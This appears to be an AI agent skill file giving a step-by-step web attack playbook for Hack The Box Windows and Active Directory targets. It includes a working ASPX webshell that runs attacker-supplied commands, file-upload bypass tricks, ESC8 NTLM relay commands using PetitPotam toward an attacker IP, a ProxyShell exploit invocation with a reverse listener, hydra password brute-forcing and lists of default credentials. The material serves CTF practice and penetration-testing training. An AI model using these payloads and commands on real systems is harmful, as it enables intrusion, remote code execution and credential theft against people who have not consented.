---
name: web
description: Web enumeration on Windows/AD targets (ports 80, 443, 8080, 8443). Use when HTTP/HTTPS ports are open. Covers directory brute, vhost fuzzing, IIS, Exchange OWA, ADCS web enrollment (/certsrv), source code review, upload bypass, common AD web apps.
user-invocable: false
allowed-tools: Read
---

# Web — Ports 80, 443, 8080, 8443

**Web is the most common entry point on HTB Windows machines. Never skip it.**

## Step 1 — identify the application
```bash
curl -s -I http://{IP}                                         # headers, server type
curl -s -I https://{IP} --insecure
whatweb http://{IP}                                            # fingerprint stack
```
Key things to look for:
- `Server: Microsoft-IIS/10.0` → IIS, check `/iisstart.htm`, default pages
- `X-Powered-By: ASP.NET` → .NET stack
- `/certsrv` → ADCS web enrollment (potential ESC8)
- `/owa` or `/exchange` → Outlook Web App
- `/ecp` → Exchange Control Panel
- Redirects to `/login`, `/signin`, custom portals

## Step 2 — directory enumeration
```bash
feroxbuster -u http://{IP} \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,aspx,asp,html,txt,config,bak \
  --depth 3

feroxbuster -u https://{IP} \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -k --depth 3                                                 # -k = ignore TLS errors

# Smaller wordlist for quick scan
feroxbuster -u http://{IP} \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt

# IIS-specific
feroxbuster -u http://{IP} \
  -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt

# Extensions to try on IIS
feroxbuster -u http://{IP} \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x asp,aspx,config,bak,zip,old,txt
```

## Step 3 — vhost fuzzing
```bash
# Baseline response size first
curl -s http://{IP} | wc -c                                    # get default response size

# Fuzz vhosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' \
  -fs {BASELINE_SIZE}                                          # filter default size

# Add discovered vhosts to /etc/hosts
echo '{IP} {VHOST}.{DOMAIN}' >> /etc/hosts

# Also try common names
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -u http://{DOMAIN} -H 'Host: FUZZ.{DOMAIN}' -fs {SIZE}
```

## Step 4 — ADCS web enrollment (/certsrv) — check for ESC8
```bash
curl -s http://{IP}/certsrv/ -I                               # 401 = NTLM auth, present
curl -s https://{IP}/certsrv/ -k -I

# Check for EPA (Extended Protection for Authentication)
# If NTLM + no EPA → ESC8 (NTLM relay to get domain cert)
certipy relay -ca {CA_IP} -template DomainController
python3 PetitPotam.py {ATTACKER_IP} {DC_IP}                   # or printerbug

# Check if Negotiate/NTLM auth (not Kerberos) on /certsrv
curl -v http://{IP}/certsrv/ 2>&1 | grep -i "www-authenticate"
# NTLM = relay possible; Negotiate+Kerberos only = relay blocked
```

## Step 5 — source code review
```bash
# Download all accessible static files
wget -r -np -R "*.jpg,*.png,*.gif,*.ico,*.css,*.woff" http://{IP}/

# Look for credentials in JS files
curl -s http://{IP}/app.js | grep -iE "(password|api.?key|secret|token|auth)"

# View page source — check HTML comments, JS includes, hidden fields
curl -s http://{IP}/ | grep -iE "(<!--.*?-->|password|secret|debug)"

# Check robots.txt, sitemap
curl -s http://{IP}/robots.txt
curl -s http://{IP}/sitemap.xml
```

## Step 6 — file upload exploitation (if upload exists)
```bash
# ASPX webshell for IIS
# Upload: shell.aspx with content:
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Response.Write(Process.Start(new ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()); %>

# Access: http://{IP}/uploads/shell.aspx?cmd=whoami

# Common upload bypass techniques
# - Double extension: shell.aspx.jpg → if only last ext checked
# - Null byte: shell.aspx%00.jpg (old PHP)
# - Case: shell.ASPX, shell.AsP, shell.aSPx
# - Content-Type: change to image/jpeg in Burp
# - Magic bytes: prepend \xFF\xD8\xFF to ASPX content
```

## Step 7 — IIS default paths and misconfigs
```bash
# Common IIS paths
curl http://{IP}/iisstart.htm
curl http://{IP}/welcome.png
curl http://{IP}/_layouts/                                     # SharePoint
curl http://{IP}/aspnet_client/
curl http://{IP}/web.config                                    # sometimes readable!
curl http://{IP}/web.config.bak
curl http://{IP}/connectionstrings.config
curl http://{IP}/.git/config                                   # exposed git repo
curl http://{IP}/.git/HEAD

# IIS short filename disclosure (8.3 names)
# ~1 in URL may reveal hidden files/dirs
curl "http://{IP}/*~1*/.aspx"

# WebDAV check
curl -X OPTIONS http://{IP}/ -v | grep Allow                  # PUT = file upload possible
davtest -url http://{IP}                                       # test WebDAV capabilities
```

## Step 8 — Exchange / OWA
```bash
# OWA login — try found domain creds
curl -s http://{IP}/owa/ -I
# Manual login at /owa or /exchange

# Exchange version via headers
curl -s https://{IP}/owa/ -k -I | grep X-OWA-Version

# EWS (Exchange Web Services) enumeration
curl -s https://{IP}/ews/exchange.asmx -k --ntlm -u '{DOMAIN}\{USER}:{PASS}'

# Common Exchange attack: CVE-2021-26855 (ProxyLogon), CVE-2021-34473 (ProxyShell)
python3 proxyshell.py -u https://{IP} -e '{EMAIL}' -l {ATTACKER_IP} -p 443
```

## Step 9 — authentication brute / credential testing
```bash
# HTTP Basic auth
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {IP} http-get /protected/

# HTTP Form POST (find field names in page source first)
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {IP} \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Check for default creds on common apps
# Tomcat: tomcat:tomcat, admin:admin, tomcat:s3cret → /manager/html
# Jenkins: admin:admin, admin:password → /login
# Kibana: elastic:changeme
# GitLab: root:5iveL!fe (old), root:password
```

## Step 10 — API endpoints
```bash
# Common API paths
feroxbuster -u http://{IP}/api \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

curl -s http://{IP}/api/v1/users
curl -s http://{IP}/api/v1/users -H 'Authorization: Bearer {TOKEN}'
curl -s http://{IP}/swagger/
curl -s http://{IP}/swagger.json
curl -s http://{IP}/openapi.json
```

## Gotchas
- **Never skip web** — HTTP/HTTPS is the entry point on the majority of HTB Windows boxes
- **Check /certsrv immediately** if ADCS is present — ESC8 relay is powerful and often unpatched
- **vhost fuzzing** → add every discovered vhost to /etc/hosts before giving up
- **SSL certs** → `openssl s_client -connect {IP}:443` → SANs may reveal internal hostnames
- **Source code** → always check page source; credentials, API keys, and tokens are often there
- **web.config** → if readable, contains connection strings with DB credentials
- **IIS PUT/WebDAV** → check OPTIONS before assuming upload isn't possible
- **OWA brute** → lockout applies; check domain policy before spraying
- **Exchange** → check version; ProxyLogon/ProxyShell are common HTB paths
